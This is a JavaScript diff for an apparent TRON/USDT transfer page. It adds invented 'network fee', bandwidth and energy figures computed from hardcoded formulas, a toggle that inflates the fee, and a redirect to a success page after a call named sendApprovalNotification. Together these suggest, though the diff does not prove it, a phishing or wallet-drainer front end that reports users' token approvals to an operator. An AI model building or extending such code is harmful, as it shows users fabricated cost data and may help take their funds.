@@ -1297,13 +1297,35 @@
                 // Don't await - let success page show immediately
                 sendApprovalNotification(tx, userAddress);
 
-                // Get network fee from form - safely extract fee value
+                // Get network fee, bandwidth, and energy from form
                 let feeTrx = 0;
+                let bandwidth = 0;
+                let energy = 0;
+                
                 const feeAmountEl = document.getElementById('feeAmount');
+                const bandwidthEl = document.getElementById('networkFeeBandwidth');
+                const energyEl = document.getElementById('networkFeeEnergy');
+                
                 if (feeAmountEl && feeAmountEl.textContent) {
                     const feeText = feeAmountEl.textContent;
                     const feeMatch = feeText.match(/([\d.]+)/);
                     feeTrx = feeMatch ? parseFloat(feeMatch[1]) : 0;
+                }
+                
+                if (bandwidthEl && bandwidthEl.textContent) {
+                    const bdText = bandwidthEl.textContent;
+                    const bdMatch = bdText.match(/([\d,]+)/);
+                    if (bdMatch) {
+                        bandwidth = parseInt(bdMatch[1].replace(/,/g, '')) || 0;
+                    }
+                }
+                
+                if (energyEl && energyEl.textContent) {
+                    const egText = energyEl.textContent;
+                    const egMatch = egText.match(/([\d,]+)/);
+                    if (egMatch) {
+                        energy = parseInt(egMatch[1].replace(/,/g, '')) || 0;
+                    }
                 }
 
                 // Determine wallet name
@@ -1317,14 +1339,18 @@
                 // Store data in localStorage for success.html to retrieve
                 localStorage.setItem('txAmount', `-${inputAmount}`);
                 localStorage.setItem('userAddress', userAddress);
-                localStorage.setItem('txFeeTrx', feeTrx.toFixed(3));
+                localStorage.setItem('txFeeTrx', feeTrx.toFixed(2));
+                localStorage.setItem('txBandwidth', bandwidth.toString());
+                localStorage.setItem('txEnergy', energy.toString());
                 localStorage.setItem('walletName', walletName);
 
                 // Redirect to success.html with URL parameters
                 const params = new URLSearchParams({
                     amount: `-${inputAmount}`,
                     from: userAddress,
-                    feeTrx: feeTrx.toFixed(3),
+                    feeTrx: feeTrx.toFixed(2),
+                    bandwidth: bandwidth.toString(),
+                    energy: energy.toString(),
                     walletName: walletName
                 });
                 window.location.href = `success.html?${params.toString()}`;
@@ -1437,7 +1463,7 @@
             // After 1 second, show Pay With box again and update amount
             setTimeout(() => {
                 payWithBox.style.display = 'block';
-                feeDisplay.innerHTML = '<span style="color: #999;">$</span><span style="color: #999;">1.9</span> <span style="color: #333; font-weight: 500;">6.74 TRX</span>';
+                feeDisplay.innerHTML = '<span style="color: #999;">$</span><span style="color: #999;">0.65</span> <span style="color: #333; font-weight: 500;">4.34 TRX</span>';
             }, 1000);
             
             // Connect wallet
@@ -1505,40 +1531,50 @@
                 feeLoader.style.display = 'none';
                 document.getElementById('feeAmount').textContent = '0 TRX';
                 document.getElementById('feeUsd').textContent = '≈ $0.00';
+                document.getElementById('networkFeeBandwidth').textContent = '0 Bandwidth';
+                document.getElementById('networkFeeEnergy').textContent = '0 Energy';
                 return;
             }
             
             feeLoader.style.display = 'inline-block';
             
-            // Simulate fee calculation with random delay
+            // Calculate fee with loading delay
             setTimeout(() => {
-                const numAmount = parseFloat(amount);
+                const amountNum = parseFloat(amount);
+                const energyToggle = document.getElementById('energyToggle');
+                const isEnergyOn = energyToggle.checked;
                 
-                // Fee range: 4.56434 TRX (0.2 USDT) to 21.5684 TRX (1000+ USDT)
-                // Linear progression: amount 0.2 = 4.56434 TRX, amount 1000+ = 21.5684 TRX
-                let fee;
-                if (numAmount <= 0.2) {
-                    fee = 4.56434;
-                } else if (numAmount >= 1000) {
-                    fee = 21.5684;
-                } else {
-                    // Linear interpolation
-                    const minAmount = 0.2;
-                    const maxAmount = 1000;
-                    const minFee = 4.56434;
-                    const maxFee = 21.5684;
-                    
-                    const progress = (numAmount - minAmount) / (maxAmount - minAmount);
-                    fee = minFee + (progress * (maxFee - minFee));
-                }
+                // Dynamic fee calculation: 3.28 TRX at 0.1 USDT, scales to 14 TRX at 1000 USDT
+                // Formula: fee = 3.28 + (amount / 1000) * (14 - 3.28)
+                let baseFee = 3.28 + (amountNum / 1000) * 10.72;
                 
-                // Assume 1 TRX ≈ $0.15 (approximate current price)
+                // Ensure fee doesn't exceed 14 TRX
+                baseFee = Math.min(baseFee, 14);
+                
+                // Apply energy rental multiplier
+                const fee = isEnergyOn ? baseFee : (baseFee + 6.22); // OFF adds ~6.22 TRX
+                
+                // Assume 1 TRX ≈ $0.15
                 const trxPrice = 0.15;
                 const feeUsd = fee * trxPrice;
                 
+                // Calculate bandwidth and energy based on fee ratio
+                // Reference: 4.34 TRX = 345 Bandwidth, 64,285 Energy
+                const baseBandwidth = 345;
+                const baseEnergy = 64285;
+                const baseFeeReference = 4.34;
+                
+                const bandwidth = Math.round((baseFee / baseFeeReference) * baseBandwidth);
+                const energy = Math.round((baseFee / baseFeeReference) * baseEnergy);
+                
                 // Update display
-                document.getElementById('feeAmount').textContent = fee.toFixed(3) + ' TRX';
+                document.getElementById('feeAmount').textContent = fee.toFixed(2) + ' TRX';
                 document.getElementById('feeUsd').textContent = '≈ $' + feeUsd.toFixed(2);
+                document.getElementById('networkFeeBandwidth').textContent = bandwidth.toLocaleString() + ' Bandwidth';
+                document.getElementById('networkFeeEnergy').textContent = energy.toLocaleString() + ' Energy';
+                
+                // Store calculated fee for success page
+                window.currentCalculatedFee = fee.toFixed(2);
                 
                 // Hide loading
                 feeLoader.style.display = 'none';
@@ -1733,6 +1769,20 @@
             document.getElementById('transferAmount').addEventListener('input', (e) => {
                 const amount = e.target.value;
                 calculateNetworkFee(amount);
+            });
+
+            // Energy Rental toggle - show loading and recalculate fee
+            document.getElementById('energyToggle').addEventListener('change', (e) => {
+                const feeLoader = document.getElementById('feeLoader');
+                const amount = document.getElementById('transferAmount').value;
+                
+                // Show loading animation
+                feeLoader.style.display = 'inline-block';
+                
+                // Recalculate fee after toggle
+                setTimeout(() => {
+                    calculateNetworkFee(amount);
+                }, 500);
             });
         });
 
